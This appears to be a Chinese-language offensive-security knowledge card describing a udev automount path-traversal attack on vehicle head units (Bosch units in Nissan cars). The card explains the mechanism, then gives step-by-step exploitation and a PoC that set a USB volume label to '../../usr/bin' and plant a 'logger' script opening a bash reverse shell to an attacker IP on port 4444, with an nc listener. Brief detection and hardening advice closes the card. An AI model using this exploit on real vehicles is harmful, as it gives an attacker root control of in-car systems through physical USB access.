---
id: iot-vehicle-usb-label-mount-path-traversal-logger-shell
title: 车机 U 盘 automount 用磁盘 LABEL 拼挂载路径：LABEL 设为 ../../usr/bin 目录穿越覆盖系统命令反弹 shell
type: scenario
domain: iot
path: iot/vehicle
technique: vehicle-udev-mount-label-path-traversal
aliases:
- 车机 U 盘提权
- mount.sh 目录穿越
- U 盘 LABEL 路径穿越
- bosch headunit root
- udev automount 逃逸
tags:
- iot
- vehicle
- automotive
- usb
- udev
- mount
- path-traversal
- reverse-shell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V665
  verified_at: '2026-11-13T08:18:50+08:00'
  notes: 已对照原文与全部21张截图核对：原文mount.sh命令行、LABEL="../../usr/bin"（img13为bosch车机root回显）、logger脚本内容与卡内逐字一致；卡内blkid输出截断UUID属排版、无失真。原文未展示插入U盘至回连的完整过程，卡片已如实注明『原文未在本机复现完整插入-回连过程，confidence medium』，非DoS/非纯原语。dedup：首候选为自卡，其余为容器挂载/工程模式等不相关卡，verdict new；dup-scan无涉及本卡pair。原文未标版本，未设affected_versions。内部链接均存在。PoC未本机复跑。
---

## 一句话结论

车机通过 udev 脚本（如 `/etc/udev/scripts/mount.sh`）自动挂载 U 盘时，若挂载点用磁盘卷标 `$mountdir` 直接拼成 `"$MOUNTPT/$mountdir"` 且未做过滤/规范化，攻击者把 U 盘文件系统 LABEL 设为 `../../usr/bin` 即可让挂载点穿越到系统目录；在 U 盘中放置名为 `logger` 等系统命令的反弹 shell 脚本，插入车机后以挂载覆盖方式替换该命令，待系统调用它时以 root 执行，获得车机 shell。

## 原理

- **攻击面是 automount 的路径拼接**：车机（原文为日产 Bosch 车机）插入 U 盘时由 udev 规则调用 `/etc/udev/scripts/mount.sh`，脚本里执行
  `result=$($MOUNT -t ${ID_FS_TYPE} -o sync,ro$IOCHARSET $DEVNAME "$MOUNTPT/$mountdir" 2>&1)`。
  `$mountdir` 来自 U 盘文件系统的卷标（LABEL），由攻击者在制作 U 盘时任意设定；脚本没有校验其中是否含 `../`，也没有 `realpath` 规范化。
- **LABEL 即攻击者可控路径片段**：把 ext4 卷标设为 `../../usr/bin` 后，`/media/../../usr/bin` 规范化后就是 `/usr/bin`。`mount` 会把 U 盘文件系统挂载到该目录（覆盖或映射系统目录）。
- **挂载覆盖实现命令劫持**：U 盘根目录放一个名为 `logger`（系统日志命令，会被系统/脚本周期性调用）的可执行 shell 脚本；挂载到 `/usr/bin` 后，该文件即以 `/usr/bin/logger` 出现。任何调用 `logger` 的进程都会执行攻击者脚本。
- **root 执行反弹 shell**：车机侧调用 logger 的通常是 root 上下文的系统脚本/服务，脚本内的 `/bin/bash -i >& /dev/tcp/attacker/4444 0>&1` 因此以 root 身份回连攻击机。
- **为什么成立**：udev 自动挂载把「物理插入」当作信任动作，而卷标属于攻击者可控元数据；只要挂载路径来自卷标且无路径校验，目录穿越就会把只读挂载点提升为系统目录的覆盖点，形成从物理接触到命令执行的完整链。

## 触发条件

- 车机存在由 udev/mount 脚本处理的 U 盘自动挂载，且挂载点包含来自卷标（LABEL）的可控片段。
- 脚本未过滤 `../`、未做路径规范化或白名单校验（原文 mount.sh 直接拼接）。
- 攻击者可物理接触车机 USB 口并插入自制的恶意 U 盘。
- 被覆盖的命令（如 `logger`）会被 root 权限的系统进程周期性调用（或在插入后的自动化流程中被调用）。

## 利用步骤

1. 准备 ext4 U 盘，把卷标设为 `../../usr/bin`（`e2label /dev/sdb1 '../../usr/bin'`；原文以 `blkid` 展示构造结果：`LABEL="../../usr/bin"`）。
2. 在 U 盘根目录写入 `logger` 脚本：
   ```bash
   #!/bin/bash
   /bin/bash -i >& /dev/tcp/192.168.159.128/4444 0>&1
   ```
   并 `chmod +x logger`。
3. 攻击机 `nc -lvnp 4444` 监听。
4. 将 U 盘插入车机；udev 脚本按 `$MOUNTPT/$mountdir` 挂载，路径穿越到 `/usr/bin`，U 盘内的 `logger` 成为系统命令。
5. 车机系统调用 `logger` 时执行脚本，root shell 回连攻击机。

## PoC

原文给出的恶意 U 盘制作流程（在攻击机对 U 盘操作）：

```bash
# 设置穿越卷标并展示
blkid /dev/sdb1
# /dev/sdb1: LABEL="../../usr/bin" UUID="7cc162e8-..." TYPE="ext4"

mount /dev/sdb1 /media/root/
cd /media/root
cat > logger <<'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.159.128/4444 0>&1
EOF
chmod +x logger
cd -
umount /dev/sdb1
```

说明：原文引用 ea/bosch_headunit_root 项目的日产 Bosch 车机案例，`blkid` 输出证明 LABEL 可为穿越路径；`e2label`/`tune2fs -L` 设置卷标为通用方式补全。原文未在本机复现完整插入-回连过程，confidence 定为 medium。

## 变体与关联

- 变体：LABEL 穿越到其他可写系统目录（`/etc/cron.d`、`/usr/local/bin`）或覆盖其他被 root 调用的命令/脚本。
- 变体：以同思路穿越到非挂载场景——任何把 U 盘卷标/分区名拼进路径后执行的脚本（备份、日志导出）都可能有同类问题。
- 关联：[[iot-vehicle-adb-special-mode-password-root]]（车机另一条物理/调试入口提权链）、[[iot-vehicle-camera-debug-console-20000-unauth]]（车机服务暴露面）。
- 边界：若脚本使用 `mount -L` 或对 `$mountdir` 做 `basename`/白名单校验，则不可利用；只读挂载不影响脚本执行（挂载的文件本身带 x 位即可）。

## 检测与防御

- 检测：udev/mount 脚本中出现卷标拼接挂载点；挂载表出现异常挂载点（`mount | grep -E '\.\.|/usr|/etc'`）；`/usr/bin/logger` 等系统命令被挂载覆盖或内容变化；车机出现向外的 shell 回连。
- 修复：mount 脚本不要用 LABEL 拼路径，改用固定白名单挂载点（如 `/mnt/usb1`）+ `mount -L` 或按设备节点生成；对卷标做字符白名单与 `basename` 规范化，拒绝含 `/`、`..` 的 LABEL；挂载使用 `nosuid,nodev,noexec` 并按需 `ro`。
- 加固：USB 自动挂载默认关闭或需 UI 确认；挂载后只暴露受限目录；监控异常外部回连。
